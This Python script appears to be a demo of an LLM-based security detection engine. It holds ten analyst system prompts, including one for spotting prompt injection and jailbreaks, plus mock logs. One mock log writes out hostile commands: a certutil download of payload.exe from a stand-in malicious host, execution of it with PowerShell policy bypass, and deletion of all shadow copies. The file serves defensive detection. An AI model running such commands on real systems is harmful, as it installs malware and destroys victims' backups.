import asyncio
import json
from typing import Dict, Any, List, Optional
from pydantic import BaseModel, Field
from openai import AsyncOpenAI

# Initialize the client pointing to your local production vLLM server stack
client = AsyncOpenAI(
    base_url="http://localhost:8000/v1",
    api_key="local-security-stack-token"
)

# ---- CONTEXT-AWARE DETECTIVE DATA SCHEMA ----

class ThreatAssessment(BaseModel):
    category: str = Field(description="The exact matching security detection domain.")
    threat_detected: bool = Field(description="True if an anomaly or security risk is identified.")
    severity: str = Field(description="The calculated impact level: LOW, MEDIUM, HIGH, or CRITICAL.")
    confidence_score: float = Field(description="The model's confidence rating between 0.0 (low) and 1.0 (absolute).")
    findings: List[str] = Field(description="Bullet-point granular indicators extracted from the raw payload data.")
    remediation_steps: Optional[str] = Field(description="Actionable blueprint or commands to isolate and fix the exploit.")
    summary: str = Field(description="A concise narrative detailing the semantic threat or context of the anomaly.")

# ---- UNIFIED REPOSITORY OF 10 SYSTEM PROMPTS ----

SYSTEM_PROMPTS = {
    # 1. Advanced Insider Threat & Behavioral Drift
    "insider_threat": (
        "You are an advanced UEBA (User and Entity Behavior Analytics) engine. Analyze the following behavioral logs "
        "for subtle anomalies, structural shifts, or non-linear process changes that signify data staging, "
        "privilege abuse, credential hopping, or outbound exfiltration drift. Return data in the requested JSON schema."
    ),
    
    # 2. Semantic Application-Level Exploits
    "semantic_exploit": (
        "You are an application-layer WAF analyzer. Inspect incoming requests, payloads, or logic sequences "
        "for semantic-level application exploits (e.g., complex business logic bypasses, authorization flaws, "
        "obfuscated multi-stage injection attacks, SSRF, or data manipulation). Return the specified JSON schema."
    ),
    
    # 3. AI and Model-Specific Attacks
    "ai_attack": (
        "You are an LLM and AI System defensive proxy. Evaluate the payload for adversarial attacks: prompt injection, "
        "jailbreaking signatures, system prompt extraction, training data leakage attempts, or denial-of-service targets "
        "designed to manipulate downstream model weights or parsing logic."
    ),
    
    # 4. System Misconfigurations and Compliance Drifts
    "configuration_drift": (
        "You are a Cloud and Architecture Compliance Auditor. Evaluate the provided system files, Docker configs, "
        "Kubernetes manifests, or IAM policies against CIS Benchmarks and standard security baselines. "
        "Identify misconfigurations, privilege creep, and drifted settings."
    ),
    
    # 5. Automated Intelligence Summarization
    "intelligence_summary": (
        "You are an automated threat intelligence summarization agent. Digest the raw technical forensic dump, "
        "STIX logs, or incident alerts into a clear tactical executive summary, extracting actionable IOCs and impact scope."
    ),
    
    # 6. Living-off-the-Land (LotL) and Fileless Attacks
    "living_off_the_land": (
        "You are an expert endpoint forensics and behavioral command-line auditor. Your task is to analyze process "
        "execution logs, PowerShell histories, and system terminal command inputs to detect Living-off-the-Land (LotL) "
        "and fileless attacks. Ignore benign administrative actions, but look for malicious administrative intent, "
        "such as anomalous chaining of native binaries (e.g., certutil downloading external payloads, vssadmin deleting "
        "shadow copies, wmic/powershell executing obfuscated or base64-encoded expressions, or unexpected registry modification). "
        "Differentiate normal system upkeep from tactical staging, defense evasion, or credential dumping. "
        "Populate and return the requested JSON schema based strictly on these indicators."
    ),
    
    # 7. Low-and-Slow Credential Stuffing & Spraying
    "low_slow_auth_spray": (
        "You are an authentication security and identity access analyst. Analyze the provided aggregated, multi-source "
        "login attempt logs spanning a broad timeline window. Your goal is to detect highly distributed, low-and-slow "
        "credential stuffing or password spraying campaigns designed to bypass traditional time-and-volume SIEM thresholds. "
        "Look for deep semantic correlations: different user accounts experiencing singular authentication failures "
        "originating from diverse, clean IP addresses or user agents within a regular distributed rhythm, or attempts "
        "targeting a unified dictionary word baseline. Distinguish these coordinated patterns from localized, "
        "organic typos or isolated user mistakes. Populate and return the requested JSON schema."
    ),
    
    # 8. Human-Flawed Phishing and Social Engineering Ingress
    "social_engineering_ingress": (
        "You are an advanced communications security analyzer specializing in social engineering and Business Email "
        "Compromise (BEC). Evaluate the provided unstructured communication payloads (e.g., email text, inbound chat strings, "
        "helpdesk tickets) for psychological and conversational manipulation. Look for indicators of corporate authority "
        "impersonation, synthetic urgency, attempts to bypass standard financial out-of-band verification procedures, "
        "unusual workflow redirection hooks, or subtle deviations from an executive's baseline vocabulary or communication style. "
        "Ignore normal priority communications, focusing purely on manipulation, deceit, or social engineering indicators. "
        "Populate and return the requested JSON schema."
    ),
    
    # 9. Advanced Ransomware Staging & Pre-Execution Fingerprints
    "ransomware_staging": (
        "You are a host file-system and EDR telemetric security auditor. Inspect the provided chronological system file-system "
        "activity logs to identify the early staging and pre-execution fingerprints of cryptographic ransomware. "
        "Look for a rapid, non-human progression of file enumerations, localized access loops on hidden network shares, "
        "the intentional destruction or inhibition of system backup points, or repetitive 'canary' file-write and rename tests "
        "across small, isolated directories. Discard typical user behaviors or indexing engine operations, focusing exclusively "
        "on the structural behavioral footprint that precedes mass-encryption deployment. Populate and return the requested JSON schema."
    ),
    
    # 10. Dynamic Data Leakage (DLP) via Shadow AI
    "shadow_ai_dlp": (
        "You are an inline Data Loss Prevention (DLP) agent protecting the perimeter against Shadow AI usage and intellectual "
        "property leaks. Evaluate the provided text payload—submitted by internal personnel toward external generative web interfaces—for "
        "out-of-distribution proprietary assets. Specifically flag unreleased product source code, internal proprietary algorithms, "
        "unmasked database connection strings, corporate financial forecasts, unredacted customer PII, or internal systemic "
        "vulnerability reports. Disregard standard, safe professional correspondence or generic engineering queries, and flag payloads "
        "where raw, confidential data assets are being exposed to an external system. Populate and return the requested JSON schema."
    )
}

# ---- CORE PROCESSING WORKER FUNCTION ----

async def analyze_security_event(category: str, raw_payload: Any) -> Dict[str, Any]:
    """
    Submits an arbitrary raw security payload to the local vLLM stack, 
    matching it against a targeted threat prompt, forcing strict Pydantic JSON parsing.
    """
    if category not in SYSTEM_PROMPTS:
        raise ValueError(f"Target category selection '{category}' does not exist in standard configurations.")

    user_content = f"Target Input for Analysis:\n```json\n{json.dumps(raw_payload, indent=2)}\n```"

    try:
        # Utilizing OpenAI tool/Structured Outputs spec supported natively by vLLM
        response = await client.beta.chat.completions.parse(
            model="meta-llama/Llama-3.1-8B-Instruct",
            messages=[
                {"role": "system", "content": SYSTEM_PROMPTS[category]},
                {"role": "user", "content": user_content}
            ],
            temperature=0.1,  # Rigid analytical tracking
            response_format=ThreatAssessment
        )
        return response.choices[0].message.parsed.model_dump()
        
    except Exception as e:
        return {
            "category": category,
            "threat_detected": True,
            "severity": "CRITICAL",
            "confidence_score": 0.0,
            "findings": [f"Pipeline exception encountered during extraction processing: {str(e)}"],
            "remediation_steps": "Check local vLLM system resources, GPU VRAM limits, or syntax alignment.",
            "summary": "Critical failure processing automated event analysis wrapper via the local LLM stack."
        }

# ---- CONCURRENT PRODUCTION DEMO UNIT ----

async def main():
    print("🛡️ Starting Security Engine Processing Runs Across 10 Target Channels...")

    # Data logs mockup containing subtle, structural exploits mapping to the new vectors
    log_inventory = {
        "living_off_the_land": {
            "host": "fin-endpoint-09",
            "session_user": "svc_backup",
            "execution_stack": [
                "certutil.exe -urlcache -split -f http://malicious-gateway.net/payload.exe %TEMP%\\p.exe",
                "powershell.exe -ExecutionPolicy Bypass -File %TEMP%\\p.exe",
                "vssadmin.exe delete shadows /all /quiet"
            ]
        },
        "low_slow_auth_spray": {
            "timeline": "00:00:00 to 06:00:00",
            "events": [
                {"source_ip": "198.51.100.12", "target_user": "alpha_manager", "status": "FAILURE_BAD_PASSWORD"},
                {"source_ip": "203.0.113.84", "target_user": "beta_engineer", "status": "FAILURE_BAD_PASSWORD"},
                {"source_ip": "192.0.2.205", "target_user": "gamma_ops", "status": "FAILURE_BAD_PASSWORD"}
            ],
            "correlation_note": "All authentication actions targeted the common fallback password value 'Winter2026!'"
        },
        "social_engineering_ingress": {
            "channel": "internal_teams_chat",
            "sender": "external_guest_account_ceo_impersonator",
            "message_body": "Hey, I am currently boarding an international flight and the cell connection is terrible. I need you to bypass standard procurement processing and instantly wire $45,000 to this vendor routing number for an emergency software renewal contract. Do it right away."
        },
        "ransomware_staging": {
            "host": "corp-file-share-02",
            "metric": "I/O Spike",
            "actions": [
                "Traversed 12,000 files in /shared/engineering/ without opening content handles",
                "Created hidden file marker '.locked_canary' in 5 distinct directory pathways",
                "Attempted execution of cryptographic library binaries via non-whitelisted paths"
            ]
        },
        "shadow_ai_dlp": {
            "endpoint_source": "marketing-workstation-12",
            "intercepted_prompt": "Please review this internal, unreleased code block containing our proprietary algorithmic trading weights and clean up the syntax: \ndef _process_proprietary_alpha_v4(): ... [REDACTED HIGH VALUE ALGO LOGIC]"
        }
    }

    # Creating batch tasks to stream to vLLM concurrently via Continuous Batching
    tasks = []
    for key, data_payload in log_inventory.items():
        tasks.append(analyze_security_event(key, data_payload))
        
    # Execute all scanning metrics in parallel on the GPU
    security_alerts = await asyncio.gather(*tasks)

    # Output formatted telemetry alerts to the control channel console
    for report in security_alerts:
        print(f"\n========================================================")
        print(f"🚨 ALERT GENERATED FOR: {report['category'].upper()}")
        print(f"========================================================")
        print(json.dumps(report, indent=2))

if __name__ == "__main__":
    asyncio.run(main())
